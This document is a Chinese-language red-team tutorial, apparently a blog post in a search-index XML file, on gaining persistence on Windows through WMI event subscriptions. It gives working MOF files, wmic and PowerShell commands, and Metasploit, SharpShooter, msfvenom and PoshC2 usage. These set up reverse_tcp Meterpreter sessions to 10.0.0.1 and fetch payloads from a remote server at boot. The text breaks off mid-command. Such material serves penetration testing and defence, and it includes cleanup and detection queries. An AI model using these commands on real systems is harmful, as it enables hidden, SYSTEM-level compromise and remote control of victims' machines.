<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>持久性-WMI事件订阅</title>
    <link href="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/"/>
    <url>/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/</url>
    
    <content type="html"><![CDATA[<p>Windows Management Instrumentation (WMI) 使系统管理员能够在本地和远程执行任务。从红队的角度来看，WMI 可用于执行多种活动，例如横向移动、持久性、态势感知、代码执行以及作为<a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/">命令和控制</a>(C2)。WMI 是几乎所有 Windows 操作系统（Windows 98-Windows 10）中都存在的 Windows 的一部分，这一事实使这些攻击性活动远离蓝队的雷达。</p><p>通常，通过 WMI 事件订阅的持久性需要创建以下三个类，它们用于存储有效负载或任意命令，指定将触发有效负载的事件并将两个类（__EventConsumer &amp;__EventFilter）关联起来，以便执行和触发绑定一起。</p><ul><li><strong>__EventFilter</strong> // 触发器（新进程、登录失败等）</li><li><strong>EventConsumer</strong> // 执行动作（执行有效载荷等）</li><li><strong>__FilterToConsumerBinding</strong> // 绑定过滤器和消费者类</li></ul><p>这种技术的实现不需要任何工具包，因为 Windows 有一个可以与 WMI (wmic) 交互的实用程序，并且也可以利用 PowerShell。然而，各种框架，如 Metasploit、Empire、PoshC2、PowerSploit 和多个 PowerShell 脚本和 C# 工具可用于自动化此技术，为代码执行提供不同的触发器和各种选项。应该注意的是，WMI 事件作为 SYSTEM 运行，在重新启动后持续存在，并且需要管理员级别的权限才能使用此技术。</p><h2 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h2><p>托管对象格式 (MOF) 是用于描述 CIM（通用信息模型）类的语言。MOF 文件通常包含语句。编译文件时添加到 WMI 存储库 (OBJECTS.DATA) 的类和类实例（mofcomp.exe 可以编译 MOF 文件，它是 Windows 的一部分）。MOF 文件的内容如下所示：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#PRAGMA NAMESPACE (&quot;////.//root//subscription&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of CommandLineEventConsumer as $Cons<br>&#123;<br>  ``Name = <span class="hljs-string">&quot;Pentestlab&quot;</span>;<br>  ``RunInteractively=false;<br>  ``Command<span class="hljs-class">LineTemplate=&quot;cmd.exe&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $Filt<br>&#123;<br>  ``Name = <span class="hljs-string">&quot;Pentestlab&quot;</span>;<br>  ``EventNamespace = <span class="hljs-string">&quot;root//subscription&quot;</span>;<br>  ``Query =<span class="hljs-string">&quot;SELECT * FROM __InstanceCreationEvent Within 3&quot;</span><br>      ``<span class="hljs-string">&quot;Where TargetInstance Isa /&quot;</span>Win32_Process/<span class="hljs-string">&quot; &quot;</span><br>      ``<span class="hljs-string">&quot;And Targetinstance.Name = /&quot;</span>notepad.exe/<span class="hljs-string">&quot; &quot;</span>;<br>  ``Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br>&#123; <br>   ``Filter = $Filt;<br>   ``Consumer = $Cons;<br>&#125;;<br></code></pre></td></tr></table></figure><p>上面的 MOF 文件会在系统上创建 notepad.exe 进程时执行 cmd.exe。MOF 文件可以通过执行以下命令部署到 WMI 存储库中：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">mofcomp.exe <span class="hljs-string">./wmi.mof</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328200653939.png" alt="image-20220328200653939"></p><p>或者，Metasploit 框架还具有生成恶意 MOF 文件的能力。从交互式 ruby 控制台执行以下命令将生成 MOF。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">irb</span><br><span class="hljs-function">puts <span class="hljs-title">generate_mof</span><span class="hljs-params">(<span class="hljs-string">&quot;Metasploit1&quot;</span>,<span class="hljs-string">&quot;Metasploit2&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201010959.png" alt="image-20220328201010959"></p><p>Microsoft 实用程序“ <em><strong>mofcomp.exe/</strong></em> ”可以编译 MOF 文件。该文件将自动存储在 WMI 存储库中，并且恶意负载/命令将自动执行。</p><p><code>mofcomp.exe ./Metasploit.mof</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201352970.png" alt="image-20220328201352970"></p><p><em><strong>在这种情况下，payload 是通过 Metasploit “ web_delivery/</strong></em> ”模块使用 regsvr32 方法远程获取的。编译 MOF 文件后，立即生成了一个 Meterpreter 会话。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201406000.png" alt="image-20220328201406000"></p><p>尽管一些 APT 的小组使用 MOF 文件作为 dropper 以实现 WMI 的持久性，但不建议将其作为一种方法。通过 WMI 事件订阅的持久性可以通过使用常见的 Microsoft 实用程序来实现，因此无需将文件放入磁盘。</p><h2 id="Command-Prompt"><a href="#Command-Prompt" class="headerlink" title="Command Prompt"></a>Command Prompt</h2><p>由于所有 Windows 操作系统都包含命令行实用程序 (wmic)，因此可以通过命令提示符执行与 WMI 的交互。执行以下命令将在<em>“ <strong>root/subscription</strong> ”</em>的名称空间中创建三个事件。每次 Windows 启动时，任意有效负载将在 60 秒内执行。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> __EventFilter <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;PentestLab&quot;, EventNameSpace=&quot;root/cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;<br><br>wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> CommandLineEventConsumer <span class="hljs-keyword">CREATE</span> <span class="hljs-type">Name</span>=&quot;PentestLab&quot;, ExecutablePath=&quot;C:/Windows/System32/pentestlab.exe&quot;,CommandLineTemplate=&quot;C:/Windows/System32/pentestlab.exe&quot;<br><br>wmic /NAMESPACE:&quot;//root/subscription&quot; <span class="hljs-type">PATH</span> __FilterToConsumerBinding <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">Filter</span>=&quot;__EventFilter.Name=/&quot;PentestLab/&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=/&quot;PentestLab/&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201541699.png" alt="image-20220328201541699"></p><p>每次重启后，可执行文件将在 60 秒内返回 Meterpreter 会话。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201632298.png" alt="image-20220328201632298"></p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>PowerShell 包含可以查询 WMI 对象并将信息检索回控制台的 cmdlet。以下命令可用于验证是否已创建任意事件以及恶意负载/命令是否存储在 WMI 存储库中。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__EventFilter<br>Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__FilterToConsumerBinding<br>Get-WMIObject` `-Namespace` `root/Subscription` `-Class` `__EventConsumer<br></code></pre></td></tr></table></figure><p>也可以通过 PowerShell 直接实现此技术。以下脚本块将在每次 Windows 启动后的 5 分钟内执行任意可执行文件“ <em><strong>pentestlab.exe ”。/</strong></em></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$FilterArgs` `= @&#123;name=``&#x27;Pentestlab-WMI&#x27;``<span class="hljs-comment">;</span><br>        ``EventNameSpace=``&#x27;root/CimV2&#x27;``<span class="hljs-comment">;</span><br>        ``QueryLanguage=``<span class="hljs-string">&quot;WQL&quot;</span>``<span class="hljs-comment">;</span><br>        ``Query=``<span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;</span>``&#125;<span class="hljs-comment">;</span><br>$Filter``=``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `__EventFilter` `-Property` `$FilterArgs<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$ConsumerArgs` `= @&#123;name=``&#x27;Pentestlab-WMI&#x27;``<span class="hljs-comment">;</span><br>        ``CommandLineTemplate=``<span class="hljs-string">&quot;$($Env:SystemRoot)/System32/pentestlab.exe&quot;</span>``<span class="hljs-comment">;&#125;</span><br>$Consumer``=``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `CommandLineEventConsumer` `-Property` `$ConsumerArgs<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">$FilterToConsumerArgs` `= @&#123;<br>Filter` `= ``[Ref]` `$Filter``<span class="hljs-comment">;</span><br>Consumer = ``[Ref]` `$Consumer``<span class="hljs-comment">;</span><br>&#125;<br>$FilterToConsumerBinding` `= ``<span class="hljs-keyword">New</span>-CimInstance` `-Namespace` `root/subscription` `-ClassName` `__FilterToConsumerBinding` `-Property` `$FilterToConsumerArgs<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201726488.png" alt="image-20220328201726488"></p><p>可以执行以下命令来执行清理并删除创建的 WMI 对象。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$EventConsumerToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Name = &#x27;Pentestlab-WMI&#x27;&quot;</span><br><br><span class="hljs-variable">$EventFilterToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;Name = &#x27;Pentestlab-WMI&#x27;&quot;</span><br><br><span class="hljs-variable">$FilterConsumerBindingToCleanup</span> = <span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Namespace</span> root/subscription <span class="hljs-literal">-Query</span> <span class="hljs-string">&quot;REFERENCES OF &#123;<span class="hljs-variable">$</span>(<span class="hljs-variable">$EventConsumerToCleanup</span>.__RELPATH)&#125; WHERE ResultClass = __FilterToConsumerBinding&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$FilterConsumerBindingToCleanup</span> | Remove-WmiObject</span><br><span class="hljs-meta"><span class="hljs-meta-keyword">$EventConsumerToCleanup</span> | Remove-WmiObject</span><br><span class="hljs-meta"><span class="hljs-meta-keyword">$EventFilterToCleanup</span> | Remove-WmiObject</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/jaredhaight/PowerPunch">PowerPunch</a>是 PowerShell 脚本的集合，其中包含用于通过 WMI 进行持久性的 PowerShell 脚本。然而，该脚本需要将<a href="https://github.com/jaredhaight/Invoke-MetasploitPayload">Invoke-MetasploitPayload</a>加载到内存中，并且负载将从远程位置下载。可以配置Metasploit 框架“ <em><strong>web_delivery ”模块来托管基于 PowerShell 的有效负载。</strong></em></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/script/web_delivery<br><span class="hljs-builtin-name">set</span> SRVHOST 0.0.0.0<br><span class="hljs-builtin-name">set</span> SRVPORT 8443<br><span class="hljs-builtin-name">set</span> SSL <span class="hljs-literal">true</span><br><span class="hljs-builtin-name">set</span> target 2<br><span class="hljs-builtin-name">set</span> URIPATH pentestlab<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LPORT 8888<br><span class="hljs-builtin-name">set</span> LHOST 10.0.0.1<br><span class="hljs-builtin-name">run</span> -j<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201803849.png" alt="image-20220328201803849"></p><p>以下命令将注册 WMI 事件订阅，并将存储将在启动期间执行的命令，以创建无文件持久性。</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs monkey"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ./Invoke-MetasploitPayload.ps1<br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> ./<span class="hljs-keyword">New</span>-WMIPersistence.ps1<br><span class="hljs-keyword">New</span>-WMIPersistence -Name Pentestlab -OnStartup -Command <span class="hljs-string">&quot;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe&quot;</span> -Arguments <span class="hljs-string">&quot;-Command Invoke-MetasploitPayload https://10.0.0.1:8443/pentestlab&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328201942160.png" alt="image-20220328201942160"></p><p>有效负载将在启动期间传递到目标主机上。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202002342.png" alt="image-20220328202002342"></p><p>Wmi <a href="https://github.com/subesp0x10/Wmi-Persistence">-Persistence</a>是一个简单的 PowerShell 脚本，支持以下触发器：启动、登录、间隔和定时。它包含三个功能，用于安装、查看和删除已创建的 WMI 事件。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Install-Persistence` `-Trigger` `Startup` `-Payload` `&quot;c:/windows/system32/pentestlab.exe<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202018419.png" alt="image-20220328202018419"></p><p>“***启动/***”触发器默认会在启动后五分钟内执行任意有效载荷。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202030401.png" alt="image-20220328202030401"></p><p><a href="https://github.com/n0pe-sled/WMI-Persistence">WMI-Persistence</a>是另一个 PowerShell 脚本，它可以创建事件过滤器，在每次重新启动后 5 分钟内从远程位置执行基于 PowerShell 的有效负载。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span><span class="hljs-operator">./</span><span class="hljs-variable">WMI</span><span class="hljs-operator">-</span><span class="hljs-variable">Persistence</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Install</span><span class="hljs-operator">-</span><span class="hljs-variable">Persistence</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202111398.png" alt="image-20220328202111398"></p><p>该脚本包含一个查看 WMI 对象的函数，以确保已正确创建任意类。</p><p><code>Check-WMI</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202242220.png" alt="image-20220328202242220"></p><p>下次重新启动 5 分钟后，有效负载将被传递，并且将与目标主机建立 Meterpreter 会话。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202255321.png" alt="image-20220328202255321"></p><p><a href="https://twitter.com/infosecn1nja">Rahmat Nurfauzi</a>开发了一个 PowerShell 脚本 ( <a href="https://gist.github.com/infosecn1nja/d9a42a68e9d3671e1fbadee5d7dc8964">WMI-Persistence )，它默认使用</a><a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">regsvr32</a>方法执行任意命令，以便从远程服务器运行任意脚本。</p><p>./WMI-Persistence</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202310689.png" alt="image-20220328202310689"></p><p>“ <em><strong>Get-WMIObject</strong></em> ” cmdlet 将确保已创建事件过滤器，因为脚本不提供任何控制台输出。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventFilter<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202327998.png" alt="image-20220328202327998"></p><p>Metasploit 框架可用于托管 scriptlet 并获取会话。然而，其他命令和控制框架（例如 PoshC2）具有类似的功能，并且可以捕获 regsvr32 有效负载。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202339048.png" alt="image-20220328202339048"></p><p><a href="https://github.com/Sw4mpf0x/PowerLurk">PowerLurk</a>是另一个支持五个触发器的 PowerShell 脚本。它们是：<em>InsertUSB</em>、<em>UserLogon</em>、<em>Timed</em>、<em>Interval</em>和<em>ProcessStart</em>。该脚本使用 WMI 存储库来存储恶意命令，该命令将执行任意脚本、可执行文件或任何其他带有参数的命令。以下函数将检索所有活动的 WMI 事件对象。</p><p><code>Get-WmiEvent</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202513598.png" alt="image-20220328202513598"></p><p>执行以下命令将创建一个任意事件订阅，该订阅将在 Windows 登录期间永久执行恶意负载。</p><p><code>Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand &quot;pentestlab.exe&quot; -Trigger UserLogon -Username any</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202535278.png" alt="image-20220328202535278"></p><h2 id="C＃"><a href="#C＃" class="headerlink" title="C＃"></a>C＃</h2><p><a href="https://twitter.com/domchell">Dominic Chell开发了一个名为</a><a href="https://github.com/mdsecactivebreach/WMIPersistence/">WMIPersist</a>的 C# 工具，它可以直接用作受感染主机上的可执行文件或通过 Cobalt Strike 使用。该工具将注册一个事件，该事件将在系统上创建目标进程时执行 base64 VBS 有效负载。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202551720.png" alt="image-20220328202551720"></p><p>Metasploit 实用程序“ <strong>msfvenom</strong> ”可以生成所需的有效负载，但也可以使用 任何其他工具，例如<a href="https://github.com/trustedsec/unicorn">unicorn 。</a></p><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o payload64.bin LHOST=10.0.0.1 LPORT=4444</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202613087.png" alt="image-20220328202613087"></p><p><a href="https://github.com/mdsecactivebreach/SharpShooter">SharpShooter</a>可用于通过使用先前生成的 shellcode 原始文件生成 VBS 格式的无阶段负载。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python SharpShooter.py <span class="hljs-params">--stageless</span> <span class="hljs-params">--dotnetver</span> 2 <span class="hljs-params">--payload</span> vbs <span class="hljs-params">--output</span> implantvbs <span class="hljs-params">--rawscfile</span> payload64.bin<br>base64 -i output/implantvbs.vbs &gt; <span class="hljs-string">/home/pentestlab.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202631176.png" alt="image-20220328202631176"></p><p>有效负载可以嵌入到 WMIPersist 工具中，并且 csc.exe 实用程序（.NET 框架的一部分）可以编译源代码，以便将其转换为可执行文件。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">csc.exe <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WMIPersist</span>.</span></span>cs /r:<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span><span class="hljs-module"><span class="hljs-identifier">Management</span>.</span><span class="hljs-module"><span class="hljs-identifier">Automation</span>.</span></span>dll<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202643540.png" alt="image-20220328202643540"></p><p>在目标主机上运行可执行文件或通过 Cobalt Strike（<strong>execute-assembly</strong>选项）将创建事件过滤器、事件使用者和订阅。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202653171.png" alt="image-20220328202653171"></p><p>从 PowerShell 控制台执行以下命令将验证有效负载是否存储在“ <strong>__EventConsumer** ”中并且“ **__EventFilter</strong> ”已创建。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventFilter<br><span class="hljs-keyword">Get</span>-WMIObject -Namespace root/<span class="hljs-keyword">Subscription</span> -<span class="hljs-keyword">Class</span> __EventConsumer<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202746048.png" alt="image-20220328202746048"></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202756341.png" alt="image-20220328202756341"></p><p>当 notepad.exe 进程启动时，payload 将被执行并打开通信通道。默认情况下，此工具使用记事本，这是一个常见的 Windows 应用程序，但可以修改代码以针对任何其他常见进程，例如 word.exe、outlook.exe、excel.exe、calc.exe，具体取决于从主机收集的信息在<a href="https://pentestlab.blog/2018/05/28/situational-awareness/">态势感知</a>期间。Metasploit 模块“ <em><strong>multi/handler</strong></em> ”或任何其他 C2 可用于捕获会话。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202807798.png" alt="image-20220328202807798"></p><h2 id="PoshC2"><a href="#PoshC2" class="headerlink" title="PoshC2"></a>PoshC2</h2><p><a href="https://github.com/nettitude/PoshC2">PoshC2</a>是一个基于 PowerShell 的命令和控制框架，但支持 C# 植入和模块，以在红队参与期间规避 EDR 产品。有一个 PowerShell 模块可以通过在特定时间执行基于 64 编码的有效负载，在目标主机上部署 WMI 事件订阅的持久性技术。</p><p><code>Invoke-wmievent -Name Posh -Command &quot;powershell -enc &lt;payload&gt;&quot; -Hour 21 -Minute 11</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202844098.png" alt="image-20220328202844098"></p><p>当命令执行时，将创建 WMI 事件，并自动将修改的 WMI 对象的结果返回到控制台屏幕上以供验证。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202853337.png" alt="image-20220328202853337"></p><p>新植入物将在设置时连接回 C2 服务器。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202902929.png" alt="image-20220328202902929"></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>Metasploit 框架包含一个通过 WMI 在目标系统上执行持久性的模块。该模块支持不同的选项，可用于触发要在系统上执行的任意有效负载。默认情况下，配置为在系统上创建特定事件 ID (4625) 时执行有效负载。支持的其他选项包括在登录期间、创建特定进程后、特定时间段后等执行有效负载。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/windows/local/wmi_persistence<br><span class="hljs-keyword">set</span> SESSION <span class="hljs-comment">1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">CALLBACK_INTERVAL 60000</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">USERNAME_TRIGGER pentestlab</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PAYLOAD windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 10.0.0.1</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4444</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202918489.png" alt="image-20220328202918489"></p><p>该模块将提供所需的命令，该命令可用于使用错误密码通过 SMB 登录主机，以生成指定的失败登录请求。当命令执行时，将生成失败的登录事件，该事件将触发有效负载并打开一个 Meterpreter 会话。</p><p><code>smbclient 